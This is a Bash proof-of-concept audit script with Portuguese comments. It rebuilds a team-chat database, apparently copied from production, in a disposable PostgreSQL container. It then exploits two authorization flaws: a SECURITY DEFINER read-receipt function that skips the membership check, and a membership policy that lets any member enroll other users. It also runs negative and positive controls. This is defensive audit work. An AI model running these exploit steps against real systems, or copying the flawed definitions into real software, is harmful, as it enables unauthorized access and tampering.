#!/usr/bin/env bash
# PoC descartavel (PostgreSQL 17) para DOIS achados de autorizacao do team chat.
#
# Espelha o padrao de scripts/db-audit/team-reaction-membership.test.sh:
#   - sobe UM container postgres:17-alpine por vez, conecta via docker exec;
#   - constroi o pre-estado (roles anon/authenticated/service_role, schema auth,
#     auth.uid()/auth.role(), tabelas e FUNCOES) e aplica as DEFINICOES REAIS
#     copiadas do canonico de producao em 2026-09-30 (pg_policies +
#     pg_get_functiondef), nao uma versao aproximada;
#   - troca de papel por `SET ROLE authenticated` + claims
#     `request.jwt.claims` (jsonb) / `request.jwt.claim.*`.
#
# Nada aqui toca producao nem o repo: tudo roda no container descartavel.
#
# ACHADO (1): public.mark_team_conversation_read(uuid) e SECURITY DEFINER com
#             EXECUTE para authenticated e NAO checa vinculo (so v_profile_id IS
#             NULL). Deve criar recibos (team_message_receipts) num time do qual o
#             perfil NAO e membro, contornando a policy estrita
#             "Members can insert own receipts".
# ACHADO (2): tcm_insert_member permite que um MEMBRO insira QUALQUER perfil na
#             propria conversa (WITH CHECK = membro OR admin/supervisor).

set -Eeuo pipefail

postgres_image="${TEAM_AUTH_POC_POSTGRES_IMAGE:-postgres:17-alpine}"
container_name="hermes-team-auth-poc-$$"

cleanup() {
  if [[ "$container_name" =~ ^hermes-team-auth-poc-[0-9]+$ ]]; then
    docker rm -f "$container_name" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT INT TERM

fail() { printf '[FAIL] %s\n' "$1" >&2; exit 1; }

psql_sql() {
  docker exec "$container_name" psql -X -qAt -v ON_ERROR_STOP=1 -U postgres -d postgres -c "$1"
}
psql_file() {
  docker exec -i "$container_name" psql -X -qAt -v ON_ERROR_STOP=1 -U postgres -d postgres < "$1"
}
# Sessao unica como authenticated com as claims do usuario.
as_user() {
  local jwt="$1" sql="$2"
  docker exec "$container_name" psql -X -qAt -v ON_ERROR_STOP=1 -U postgres -d postgres \
    -c "SET ROLE authenticated; SELECT set_config('request.jwt.claims', '$jwt', false); $sql"
}

expect_ok() { local l="$1" s="$2"; psql_sql "$s" >/dev/null || fail "$l: deveria ter sucesso"; printf '[PASS] %s\n' "$l"; }
expect_value() {
  local l="$1" e="$2" s="$3" a
  a="$(psql_sql "$s" | tail -n1)"
  [[ "$a" == "$e" ]] || fail "$l: esperado '$e', obtido '$a'"
  printf '[PASS] %s\n' "$l"
}
expect_ok_as() { local l="$1" j="$2" s="$3"; as_user "$j" "$s" >/dev/null || fail "$l: deveria ter sucesso (como authenticated)"; printf '[PASS] %s\n' "$l"; }
expect_value_as() {
  local l="$1" e="$2" j="$3" s="$4" a
  a="$(as_user "$j" "$s" | tail -n1)"
  [[ "$a" == "$e" ]] || fail "$l: esperado '$e', obtido '$a'"
  printf '[PASS] %s\n' "$l"
}
expect_error_as() {
  local l="$1" needle="$2" j="$3" s="$4" out st
  set +e; out="$(as_user "$j" "$s" 2>&1)"; st=$?; set -e
  (( st == 0 )) && { printf '%s\n' "$out" >&2; fail "$l: deveria falhar, mas passou"; }
  [[ "$out" == *"$needle"* ]] || { printf '%s\n' "$out" >&2; fail "$l: esperava '$needle' no erro"; }
  printf '[PASS] %s\n' "$l"
}

command -v docker >/dev/null 2>&1 || fail 'Docker nao esta instalado'
docker info >/dev/null 2>&1 || fail 'Docker daemon nao esta acessivel'

echo "== container: $container_name (imagem $postgres_image) =="
docker run --rm -d --name "$container_name" -e POSTGRES_PASSWORD=test_only "$postgres_image" >/dev/null

ready=0
for _ in $(seq 1 90); do
  if psql_sql 'SELECT 1' >/dev/null 2>&1; then ready=$((ready + 1)); (( ready >= 2 )) && break; else ready=0; fi
  sleep 1
done
(( ready >= 2 )) || fail 'PostgreSQL descartavel nao ficou pronto de forma estavel'

tmp_dir="$(mktemp -d)"
trap 'rm -rf "$tmp_dir"; cleanup' EXIT INT TERM

# ---------------------------------------------------------------------------
# PRE-ESTADO: infraestrutura Supabase + tabelas + FUNCOES + POLICIES REAIS do
# canonico de producao (pg_policies / pg_get_functiondef, medidos 2026-09-30).
# ---------------------------------------------------------------------------
cat > "$tmp_dir/pre.sql" <<'SQL'
CREATE ROLE anon NOLOGIN;
CREATE ROLE authenticated NOLOGIN;
CREATE ROLE service_role NOLOGIN BYPASSRLS;

CREATE SCHEMA auth;
CREATE FUNCTION auth.uid() RETURNS uuid LANGUAGE sql STABLE
  AS $$ SELECT coalesce(
       nullif(current_setting('request.jwt.claim.sub', true), ''),
       nullif(current_setting('request.jwt.claims', true), '')::jsonb ->> 'sub'
     )::uuid $$;
CREATE FUNCTION auth.role() RETURNS text LANGUAGE sql STABLE
  AS $$ SELECT coalesce(
       nullif(current_setting('request.jwt.claim.role', true), ''),
       nullif(current_setting('request.jwt.claims', true), '')::jsonb ->> 'role'
     )::text $$;
GRANT USAGE ON SCHEMA auth TO anon, authenticated, service_role;

CREATE TABLE public.profiles (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL UNIQUE,
  role text DEFAULT 'agent',
  is_active boolean DEFAULT true
);
CREATE TABLE public.user_roles (
  user_id uuid NOT NULL,
  role text NOT NULL,
  PRIMARY KEY (user_id, role)
);
CREATE TABLE public.team_conversations (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  type text NOT NULL DEFAULT 'direct',
  name text,
  created_by uuid REFERENCES public.profiles(id),
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE TABLE public.team_conversation_members (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id uuid NOT NULL REFERENCES public.team_conversations(id) ON DELETE CASCADE,
  profile_id uuid NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  joined_at timestamptz NOT NULL DEFAULT now(),
  last_read_at timestamptz DEFAULT now(),
  is_pinned boolean NOT NULL DEFAULT false,
  is_archived boolean NOT NULL DEFAULT false,
  member_role text NOT NULL DEFAULT 'member',
  UNIQUE (conversation_id, profile_id)
);
CREATE TABLE public.team_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id uuid NOT NULL REFERENCES public.team_conversations(id) ON DELETE CASCADE,
  sender_id uuid NOT NULL REFERENCES public.profiles(id),
  content text NOT NULL DEFAULT '',
  message_type text NOT NULL DEFAULT 'text',
  created_at timestamptz NOT NULL DEFAULT now()
);
-- fiel ao canonico: conversation_id NOT NULL (20260929440000).
CREATE TABLE public.team_message_receipts (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  message_id uuid NOT NULL REFERENCES public.team_messages(id) ON DELETE CASCADE,
  profile_id uuid NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  status text NOT NULL DEFAULT 'delivered',
  delivered_at timestamptz DEFAULT now(),
  read_at timestamptz,
  conversation_id uuid NOT NULL REFERENCES public.team_conversations(id) ON DELETE CASCADE,
  UNIQUE (message_id, profile_id),
  CHECK (status IN ('delivered','read'))
);

-- ---- FUNCOES: definicoes REAIS de producao ----
CREATE OR REPLACE FUNCTION public.current_profile_id() RETURNS uuid
  LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public', 'pg_temp'
  AS $function$ SELECT id FROM public.profiles WHERE user_id = auth.uid() LIMIT 1; $function$;
REVOKE EXECUTE ON FUNCTION public.current_profile_id() FROM PUBLIC, anon;
GRANT EXECUTE ON FUNCTION public.current_profile_id() TO authenticated;

CREATE OR REPLACE FUNCTION public.is_admin_or_supervisor(_user_id uuid) RETURNS boolean
  LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public'
  AS $function$
    SELECT EXISTS (
      SELECT 1 FROM public.user_roles
      WHERE user_id = _user_id AND role IN ('admin', 'supervisor')
    )
  $function$;

CREATE OR REPLACE FUNCTION public.is_team_conversation_member(_user_id uuid, _conversation_id uuid) RETURNS boolean
  LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public'
  AS $function$
    SELECT EXISTS (
      SELECT 1 FROM public.team_conversation_members tcm
      JOIN public.profiles p ON p.id = tcm.profile_id
      WHERE tcm.conversation_id = _conversation_id
        AND p.user_id = _user_id
    );
  $function$;

-- Triggers reais dos recibos: preenchem conversation_id e barram recibo da
-- propria mensagem. Sem eles o INSERT do proprio RPC (que NAO passa
-- conversation_id) estouraria NOT NULL e o achado daria falso-negativo.
CREATE OR REPLACE FUNCTION public.team_receipts_fill_conversation_id() RETURNS trigger
  LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $f$
BEGIN
  IF NEW.conversation_id IS NULL THEN
    SELECT tm.conversation_id INTO NEW.conversation_id FROM public.team_messages tm WHERE tm.id = NEW.message_id;
  END IF;
  IF NEW.conversation_id IS NULL THEN
    RAISE EXCEPTION 'conversation_id_required: message % has no conversation_id', NEW.message_id;
  END IF;
  RETURN NEW;
END; $f$;
CREATE OR REPLACE FUNCTION public.team_receipts_no_own_sender() RETURNS trigger
  LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $f$
BEGIN
  IF EXISTS (SELECT 1 FROM public.team_messages WHERE id = NEW.message_id AND sender_id = NEW.profile_id) THEN
    RAISE EXCEPTION 'sender cannot create receipt for own message';
  END IF;
  RETURN NEW;
END; $f$;

-- (1) RPC REAL de producao: SECURITY DEFINER, so checa v_profile_id IS NULL.
CREATE OR REPLACE FUNCTION public.mark_team_conversation_read(p_conversation_id uuid) RETURNS void
  LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
  AS $function$
DECLARE
  v_profile_id uuid := public.current_profile_id();
  v_now        timestamptz := now();
BEGIN
  IF v_profile_id IS NULL THEN RAISE EXCEPTION 'not_authenticated'; END IF;

  INSERT INTO public.team_message_receipts(message_id, profile_id, status, delivered_at, read_at)
  SELECT m.id, v_profile_id, 'read', v_now, v_now
    FROM public.team_messages m
   WHERE m.conversation_id = p_conversation_id
     AND m.sender_id <> v_profile_id
     AND NOT EXISTS (
       SELECT 1 FROM public.team_message_receipts r
        WHERE r.message_id = m.id AND r.profile_id = v_profile_id AND r.status = 'read'
     )
  ON CONFLICT (message_id, profile_id) DO UPDATE
     SET status = 'read', read_at = v_now;

  UPDATE public.team_conversation_members
     SET last_read_at = v_now
   WHERE conversation_id = p_conversation_id
     AND profile_id = v_profile_id;
END;
$function$;
REVOKE EXECUTE ON FUNCTION public.mark_team_conversation_read(uuid) FROM PUBLIC, anon;
GRANT EXECUTE ON FUNCTION public.mark_team_conversation_read(uuid) TO authenticated;

-- ---- RLS + POLICIES: texto REAL do canonico ----
ALTER TABLE public.team_message_receipts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.team_conversation_members ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.team_conversations ENABLE ROW LEVEL SECURITY;

-- (1) estrita: exige profile_id = current_profile_id() E membro da conversa.
CREATE POLICY "Members can insert own receipts" ON public.team_message_receipts FOR INSERT TO authenticated
  WITH CHECK (
    profile_id = public.current_profile_id()
    AND EXISTS (
      SELECT 1 FROM public.team_conversation_members mem
      JOIN public.team_messages tm ON tm.id = team_message_receipts.message_id
      WHERE mem.conversation_id = tm.conversation_id
        AND mem.profile_id = team_message_receipts.profile_id
    )
  );
CREATE POLICY "Conversation members can read receipts" ON public.team_message_receipts FOR SELECT TO authenticated
  USING (public.is_admin_or_supervisor(auth.uid()) OR EXISTS (
    SELECT 1 FROM public.team_conversation_members mem
    JOIN public.team_messages tm ON tm.id = team_message_receipts.message_id
    WHERE mem.conversation_id = tm.conversation_id AND mem.profile_id = public.current_profile_id()));
CREATE POLICY team_message_receipts_update_own ON public.team_message_receipts FOR UPDATE TO authenticated
  USING (profile_id = public.current_profile_id())
  WITH CHECK (profile_id = public.current_profile_id() AND status = 'read');

-- (2) tcm_insert_member: membro OU admin/supervisor (SEM exigir admin p/ incluir terceiro).
CREATE POLICY tcm_select_own ON public.team_conversation_members FOR SELECT TO authenticated
  USING (public.is_team_conversation_member(auth.uid(), conversation_id));
CREATE POLICY tcm_insert_member ON public.team_conversation_members FOR INSERT TO authenticated
  WITH CHECK (
    EXISTS (SELECT 1 FROM public.team_conversation_members m2
            WHERE m2.conversation_id = team_conversation_members.conversation_id
              AND m2.profile_id = public.current_profile_id())
    OR EXISTS (SELECT 1 FROM public.profiles p
               WHERE p.id = public.current_profile_id() AND p.role = ANY(ARRAY['admin','supervisor']))
  );
CREATE POLICY tcm_delete_own_or_admin ON public.team_conversation_members FOR DELETE TO authenticated
  USING (profile_id = public.current_profile_id()
         OR EXISTS (SELECT 1 FROM public.profiles p
                    WHERE p.id = public.current_profile_id() AND p.role = ANY(ARRAY['admin','supervisor'])));
CREATE POLICY tcm_update_own_prefs ON public.team_conversation_members FOR UPDATE TO authenticated
  USING (profile_id = public.current_profile_id())
  WITH CHECK (profile_id = public.current_profile_id());

CREATE POLICY "Members can view their conversations" ON public.team_conversations FOR SELECT TO authenticated
  USING (public.is_team_conversation_member(auth.uid(), id)
         OR created_by = (SELECT p.id FROM public.profiles p WHERE p.user_id = auth.uid() LIMIT 1));
CREATE POLICY "Authenticated users can create conversations" ON public.team_conversations FOR INSERT TO authenticated
  WITH CHECK (created_by = (SELECT p.id FROM public.profiles p WHERE p.user_id = auth.uid() LIMIT 1));
CREATE POLICY "Conversation creator or admin can delete" ON public.team_conversations FOR DELETE TO authenticated
  USING (created_by = public.current_profile_id() OR public.is_admin_or_supervisor(auth.uid()));
CREATE POLICY team_conversations_update_own ON public.team_conversations FOR UPDATE TO authenticated
  USING (created_by = public.current_profile_id())
  WITH CHECK (created_by = public.current_profile_id());

-- ---- Grants de producao (tabelas abertas; so a RLS segura) ----
GRANT SELECT, INSERT, UPDATE ON public.team_message_receipts TO authenticated;
REVOKE DELETE ON public.team_message_receipts FROM authenticated;
GRANT SELECT, INSERT, DELETE ON public.team_conversation_members TO authenticated;
GRANT SELECT, INSERT, DELETE, UPDATE ON public.team_conversations TO authenticated;
GRANT SELECT ON public.team_messages TO authenticated;
GRANT SELECT ON public.profiles TO authenticated;

-- Triggers reais dos recibos.
CREATE TRIGGER team_receipts_fill_conversation_id_trig BEFORE INSERT ON public.team_message_receipts
  FOR EACH ROW EXECUTE FUNCTION public.team_receipts_fill_conversation_id();
CREATE TRIGGER team_receipts_no_own_sender_trig BEFORE INSERT ON public.team_message_receipts
  FOR EACH ROW EXECUTE FUNCTION public.team_receipts_no_own_sender();
SQL

cat > "$tmp_dir/seed.sql" <<'SQL'
DELETE FROM public.team_message_receipts;
DELETE FROM public.team_messages;
DELETE FROM public.team_conversation_members;
DELETE FROM public.team_conversations;
DELETE FROM public.user_roles;
DELETE FROM public.profiles;

-- ATILA (A): membro SO do Time A.
-- BETO  (B): membro SO do Time B.
-- CARLA (C): nao e membro de nenhum time (alvo do achado 2).
-- DORA  (D): membro do Time A (para o caminho legitimo do achado 1).
INSERT INTO public.profiles (id, user_id, role, is_active) VALUES
  ('a0000000-0000-0000-0000-000000000001', '11111111-1111-1111-1111-111111111111', 'agent', true),
  ('c0000000-0000-0000-0000-000000000001', '33333333-3333-3333-3333-333333333333', 'agent', true),
  ('b0000000-0000-0000-0000-000000000001', '22222222-2222-2222-2222-222222222222', 'agent', true),
  ('f0000000-0000-0000-0000-000000000001', '44444444-4444-4444-4444-444444444444', 'agent', true);

INSERT INTO public.team_conversations (id, type, name, created_by) VALUES
  ('e0000000-0000-0000-0000-00000000000a', 'group', 'Time A', 'a0000000-0000-0000-0000-000000000001'),
  ('e0000000-0000-0000-0000-00000000000b', 'group', 'Time B', 'c0000000-0000-0000-0000-000000000001');

INSERT INTO public.team_conversation_members (conversation_id, profile_id) VALUES
  ('e0000000-0000-0000-0000-00000000000a', 'a0000000-0000-0000-0000-000000000001'),
  ('e0000000-0000-0000-0000-00000000000a', 'f0000000-0000-0000-0000-000000000001'),
  ('e0000000-0000-0000-0000-00000000000b', 'c0000000-0000-0000-0000-000000000001');

INSERT INTO public.team_messages (id, conversation_id, sender_id, content) VALUES
  ('d0000000-0000-0000-0000-00000000000a', 'e0000000-0000-0000-0000-00000000000a', 'a0000000-0000-0000-0000-000000000001', 'mensagem do proprio A no Time A (nao gera recibo de A)'),
  ('d0000000-0000-0000-0000-00000000000d', 'e0000000-0000-0000-0000-00000000000a', 'f0000000-0000-0000-0000-000000000001', 'mensagem da DORA no Time A (gera recibo legitimo de A)'),
  ('d0000000-0000-0000-0000-00000000000b', 'e0000000-0000-0000-0000-00000000000b', 'c0000000-0000-0000-0000-000000000001', 'mensagem do OUTRO time (B) 1'),
  ('d0000000-0000-0000-0000-00000000000c', 'e0000000-0000-0000-0000-00000000000b', 'c0000000-0000-0000-0000-000000000001', 'mensagem do OUTRO time (B) 2');
SQL

psql_file "$tmp_dir/pre.sql" >/dev/null
psql_file "$tmp_dir/seed.sql" >/dev/null

ATILA='{"sub":"11111111-1111-1111-1111-111111111111","role":"authenticated"}'
BETO='{"sub":"33333333-3333-3333-3333-333333333333","role":"authenticated"}'
PERFIL_A='a0000000-0000-0000-0000-000000000001'
PERFIL_C='b0000000-0000-0000-0000-000000000001'
PERFIL_BETO='c0000000-0000-0000-0000-000000000001'
MSG_B1='d0000000-0000-0000-0000-00000000000b'
CONV_A='e0000000-0000-0000-0000-00000000000a'
CONV_B='e0000000-0000-0000-0000-00000000000b'

echo
echo '================================================================================'
echo 'ACHADO (1): mark_team_conversation_read escreve recibos cross-team (SECURITY DEFINER)'
echo '================================================================================'

expect_value '0.1 pre-estado: A NAO e membro do Time B' '0' \
  "SELECT count(*) FROM public.team_conversation_members WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_A';"

echo '--- CONTAGEM ANTES (como superusuario postgres, ignora RLS) ---'
psql_sql "SELECT 'recibos_de_A_no_TimeB_antes=' || count(*) FROM public.team_message_receipts WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_A';"

echo '--- EXPLOIT: A chama mark_team_conversation_read(<conversa do Time B>) ---'
set +e
out_a="$(as_user "$ATILA" "SELECT public.mark_team_conversation_read('$CONV_B');" 2>&1)"; st_a=$?
set -e
printf 'saida crua (exit=%s): %s\n' "$st_a" "$(printf '%s' "$out_a" | tr '\n' '|')"
[[ $st_a -eq 0 ]] || fail '1.exploit: a RPC deveria ter sucesso como authenticated'
printf '[PASS] 1.exploit: a RPC retornou exit 0 (sem not_member/not_authenticated)\n'

echo '--- CONTAGEM DEPOIS ---'
psql_sql "SELECT 'recibos_de_A_no_TimeB_depois=' || count(*) FROM public.team_message_receipts WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_A';"

expect_value '1.1 (EXPLOIT) A criou recibos no Time B do qual NAO e membro (2 mensagens de B)' '2' \
  "SELECT count(*) FROM public.team_message_receipts WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_A';"
expect_value '1.2 recibos nascem com status=read' '2' \
  "SELECT count(*) FROM public.team_message_receipts WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_A' AND status='read';"

echo
echo '--- CONTROLE NEGATIVO (MESMO insert direto, como authenticated) DEVE ser negado pela RLS ---'
expect_error_as '1.neg1 insert DIRETO de recibo no Time B (caminho PostgREST) e barrado pela RLS' \
  'row-level security policy' "$ATILA" \
  "INSERT INTO public.team_message_receipts (message_id, profile_id, status, delivered_at, read_at) VALUES ('$MSG_B1','$PERFIL_A','read',now(),now());"

expect_value '1.neg2 o insert direto negado NAO gravou nada' '2' \
  "SELECT count(*) FROM public.team_message_receipts WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_A';"

echo
echo '--- CONTROLE POSITIVO: o caminho legitimo do proprio time continua funcionando ---'
expect_ok_as '1.pos1 A chama mark_team_conversation_read(<conversa do Time A, dele>)' \
  "$ATILA" "SELECT public.mark_team_conversation_read('$CONV_A');"
expect_value '1.pos2 recibo legitimo gravado no Time A' '1' \
  "SELECT count(*) FROM public.team_message_receipts WHERE conversation_id='$CONV_A' AND profile_id='$PERFIL_A';"

echo
echo '================================================================================'
echo 'ACHADO (2): tcm_insert_member deixa um membro inscrever QUALQUER perfil na propria conversa'
echo '================================================================================'

echo '--- EXPLOIT: A (membro do Time A) insere CARLA (nao-membro) no Time A ---'
set +e
out_b="$(as_user "$ATILA" "INSERT INTO public.team_conversation_members (conversation_id, profile_id) VALUES ('$CONV_A','$PERFIL_C');" 2>&1)"; st_b=$?
set -e
printf 'saida crua (exit=%s): %s\n' "$st_b" "$(printf '%s' "$out_b" | tr '\n' '|')"
[[ $st_b -eq 0 ]] || fail '2.exploit: A deveria conseguir inscrever terceiro na propria conversa'
printf '[PASS] 2.exploit: INSERT do terceiro passou (exit 0)\n'

expect_value '2.1 (EXPLOIT) CARLA virou membro do Time A sem ser admin' '1' \
  "SELECT count(*) FROM public.team_conversation_members WHERE conversation_id='$CONV_A' AND profile_id='$PERFIL_C';"
expect_value '2.2 quem inseriu foi ATILA (perfil nao-admin, role=agent)' 'agent' \
  "SELECT role FROM public.profiles WHERE id='$PERFIL_A';"

echo
echo '--- CONTROLE NEGATIVO 1: um NAO-membro tentando se auto-inserir numa conversa alheia DEVE ser negado ---'
expect_error_as '2.neg1 BETO (nao-membro) tentando se inserir no Time A e barrado pela RLS' \
  'row-level security policy' "$BETO" \
  "INSERT INTO public.team_conversation_members (conversation_id, profile_id) VALUES ('$CONV_A','$PERFIL_BETO');"
expect_value '2.neg2 o auto-insert negado NAO gravou nada' '0' \
  "SELECT count(*) FROM public.team_conversation_members WHERE conversation_id='$CONV_A' AND profile_id='$PERFIL_BETO';"

echo '--- CONTROLE NEGATIVO 2: um membro NAO pode inscrever ninguem numa conversa ALHEIA ---'
expect_error_as '2.neg3 ATILA inserindo terceiro no Time B (de que NAO e membro) e barrado' \
  'row-level security policy' "$ATILA" \
  "INSERT INTO public.team_conversation_members (conversation_id, profile_id) VALUES ('$CONV_B','$PERFIL_C');"
expect_value '2.neg4 o insert alheio negado NAO gravou nada' '0' \
  "SELECT count(*) FROM public.team_conversation_members WHERE conversation_id='$CONV_B' AND profile_id='$PERFIL_C';"

echo
echo '================================================================================'
echo '(C) ALCANCABILIDADE COM JWT NORMAL DO APP + DESCOBERTA DO UUID'
echo '================================================================================'

echo '--- policy de SELECT de team_conversations: A enxerga so o proprio time? ---'
expect_value_as 'C.1 A (authenticated, claims normais) so ve 1 conversa (o Time A)' '1' \
  "$ATILA" "SELECT count(*) FROM public.team_conversations;"
expect_value_as 'C.2 e o Time B NAO aparece para A' '0' \
  "$ATILA" "SELECT count(*) FROM public.team_conversations WHERE id='$CONV_B';"

echo '--- PRECONDICAO do exploit: o UUID do Time B nao e descobrivel pela tabela (RLS o esconde de A) ---'
expect_value_as 'C.3 A nao consegue listar o UUID do Time B por SELECT em team_conversations' '0' \
  "$ATILA" "SELECT count(*) FROM public.team_conversations WHERE id='$CONV_B';"

echo '--- CONFIRMA que a RPC roda com as claims NORMAIS do app (role=authenticated) ---'
expect_value_as 'C.4 auth.role() = authenticated com as claims do JWT do app' 'authenticated' \
  "$ATILA" "SELECT auth.role();"

echo
printf '\n[OK] PoC concluido: os dois achados foram exercitados no container descartavel.\n'
